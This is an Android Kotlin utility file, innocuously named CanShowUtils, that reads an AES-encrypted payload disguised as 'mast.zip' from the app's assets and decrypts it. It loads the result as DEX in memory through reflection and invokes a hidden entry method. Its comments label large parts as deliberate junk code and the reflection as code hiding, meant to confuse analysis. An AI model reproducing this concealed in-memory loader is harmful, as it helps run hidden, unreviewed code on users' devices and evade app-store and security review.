package gh.cark

import android.content.Context
import android.util.Base64
import android.util.Log
import java.lang.reflect.InvocationTargetException
import java.nio.ByteBuffer
import java.security.MessageDigest
import javax.crypto.Cipher
import javax.crypto.spec.SecretKeySpec
import kotlin.random.Random

object CanShowUtils {
    private const val ALGORITHM = "AES"

    private val DEX_AES_KEY: ByteArray
        get() {
            val kuangKey = NcZong.getKeyTypeValue(NcZong.akv, "\"kuang_key\"")
            return kuangKey.toByteArray()

        }

    private const val ENCRYPTED_DEX_FILE = "mast.zip"
    private var helperFlag = false
    private var checksumValue = 0L

    fun loadAndExecuteDex(context: Context) {
        // 预检查（垃圾代码，不影响逻辑）
        if (performPreValidation(context)) {
            helperFlag = true
        }
        try {

            // 环境检测（垃圾代码）
            performEnvironmentCheck(context)

            // 1. 从assets读取加密的文本
            val encryptedText = readEncryptedTextFromAssets(context)
            if (encryptedText.isEmpty()) {
                return
            }

            // 计算校验和（垃圾代码）
            checksumValue = calculateChecksum(encryptedText)

            // 2. 解密得到DEX字节数组
            val dexBytes = decryptDex(encryptedText)

            // 3. 加载DEX
            loadDexInMemory(context, dexBytes)
        } catch (e: Exception) {
            e.printStackTrace()
        } finally {
            // 清理标志（垃圾代码）
            performCleanup()
        }
    }

    /**
     * 预验证检查（垃圾代码 - 不影响实际逻辑）
     */
    private fun performPreValidation(context: Context): Boolean {
        return try {
            val packageName = context.packageName
            val appName = context.applicationInfo.name ?: ""
            // 总是返回true，但增加代码复杂度
            packageName.isNotEmpty() || appName.isEmpty()
        } catch (e: Exception) {
            true
        }
    }

    /**
     * 环境检测（垃圾代码 - 不影响实际逻辑）
     */
    private fun performEnvironmentCheck(context: Context) {
        runCatching {
            // 获取一些环境信息但不使用
            val filesDir = context.filesDir
            val cacheDir = context.cacheDir

            // 检查目录存在性（结果不影响流程）
            val filesDirExists = filesDir?.exists() ?: false
            val cacheDirExists = cacheDir?.exists() ?: false

            // 生成随机数（不使用）
            val randomValue = Random.Default.nextInt(1000)

            // 这些检查不影响实际逻辑
            if (filesDirExists && cacheDirExists && randomValue > -1) {
                // 什么都不做
            }
        }
    }

    /**
     * 计算校验和（垃圾代码 - 计算但不验证）
     */
    private fun calculateChecksum(data: String): Long {
        return try {
            val md = MessageDigest.getInstance("MD5")
            val digest = md.digest(data.toByteArray())
            // 转换为long但不验证
            var checksum = 0L
            digest.forEachIndexed { index, byte ->
                checksum += (byte.toLong() shl (index % 8))
            }
            checksum
        } catch (e: Exception) {
            System.currentTimeMillis()
        }
    }

    /**
     * 执行清理（垃圾代码 - 重置标志但无实际作用）
     */
    private fun performCleanup() {
        helperFlag = false
        checksumValue = 0L
    }


    private fun readEncryptedTextFromAssets(context: Context): String {
        return try {
            val text = context.assets.open(ENCRYPTED_DEX_FILE).bufferedReader().use { it.readText() }
            text
        } catch (e: Exception) {
            ""
        }
    }


    private fun decryptDex(encryptedText: String): ByteArray {
        // 预处理检查（垃圾代码）
        val shouldProceed = verifyDataIntegrity(encryptedText)

        // 1. Base64解码
        val encryptedBytes = Base64.decode(encryptedText, Base64.DEFAULT)
        // 2. AES解密
        val key = SecretKeySpec(DEX_AES_KEY, ALGORITHM)
        val cipher = Cipher.getInstance(ALGORITHM)
        cipher.init(Cipher.DECRYPT_MODE, key)

        val decryptedData = cipher.doFinal(encryptedBytes)

        // 后处理验证（垃圾代码）
        if (shouldProceed) {
            performPostDecryptionCheck(decryptedData)
        }

        return decryptedData
    }


    private fun verifyDataIntegrity(data: String): Boolean {
        return try {
            data.length > 10
        } catch (e: Exception) {
            true
        }
    }

    /**
     * 解密后检查（垃圾代码 - 检查但不采取行动）
     */
    private fun performPostDecryptionCheck(data: ByteArray) {
        runCatching {
            // 检查数据大小
            val dataSize = data.size

            // 检查魔数（DEX文件头），但不验证
            if (data.size >= 4) {
                val magic = String(data.copyOfRange(0, 3))
                // 不验证结果，只是增加代码复杂度
                val isDexFormat = magic == "dex"
            }

            // 生成一些随机检查
            val randomCheck = Random.Default.nextBoolean()
            if (randomCheck && dataSize > 0) {
                // 什么都不做
            }
        }
    }


    private fun loadDexInMemory(context: Context, dexBytes: ByteArray) {
        try {
            // 加载前准备（垃圾代码）
            prepareForLoading(context)

            // 创建ByteBuffer
            val byteBuffer = ByteBuffer.wrap(dexBytes)

            // 使用反射创建InMemoryDexClassLoader（代码隐藏）
            val clazz = Class.forName("dalvik.system.InMemoryDexClassLoader")
            val constructor = clazz.getDeclaredConstructor(
                Class.forName("java.nio.ByteBuffer"),
                Class.forName("java.lang.ClassLoader")
            )

            // 获取应用的ClassLoader
            val parentClassLoader = context.javaClass.getMethod("getClassLoader").invoke(context)

            // 创建ClassLoader实例
            val classLoader = constructor.newInstance(byteBuffer, parentClassLoader)


            // 加载DEX中的入口类（com.ggc.show.MasterRu）
            val loadedClass = classLoader.javaClass.getMethod("loadClass", String::class.java)
                .invoke(classLoader, "com.ggc.show.MasterRu") as Class<*>


            // 直接调用DEX中的方法
            invokeDexMethod(loadedClass, context)

        } catch (e: Exception) {
            e.printStackTrace()
        } finally {
            // 加载后清理（垃圾代码）
            cleanupAfterLoading()
        }
    }

    /**
     * 加载前准备（垃圾代码 - 不影响逻辑）
     */
    private fun prepareForLoading(context: Context) {
        runCatching {
            // 获取系统信息（不使用）
            val systemTime = System.currentTimeMillis()
            val freeMemory = Runtime.getRuntime().freeMemory()

            // 创建一些临时对象（立即被垃圾回收）
            val tempList = mutableListOf<Int>()
            for (i in 0..10) {
                tempList.add(Random.Default.nextInt())
            }

            // 这些操作不影响实际加载
            if (systemTime > 0 && freeMemory > 0 && tempList.isNotEmpty()) {
                // 什么都不做
            }
        }
    }

    /**
     * 加载后清理（垃圾代码 - 不影响逻辑）
     */
    private fun cleanupAfterLoading() {
        runCatching {
            // 触发一次GC建议（不保证执行）
            System.gc()

            // 重置一些标志
            helperFlag = false
        }
    }


    private fun invokeDexMethod(coreClass: Class<*>, context: Context) {
        try {
            // 检查参数
            NcZong.showLog("DexLoaderHelper: context=${context.javaClass.name}")

            // 获取jkks静态方法 - 新签名：(Object context)
            val jkksMethod = coreClass.getDeclaredMethod(
                "jkks",
                Any::class.java        // Object context
            )

            // 设置方法可访问
            jkksMethod.isAccessible = true


            // 调用静态方法，只传递context
            jkksMethod.invoke(null, context)

            Log.e("TAG", "jkks-success")
        } catch (e: NoSuchMethodException) {
            e.printStackTrace()
        } catch (e: InvocationTargetException) {
            e.targetException?.printStackTrace()
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }


}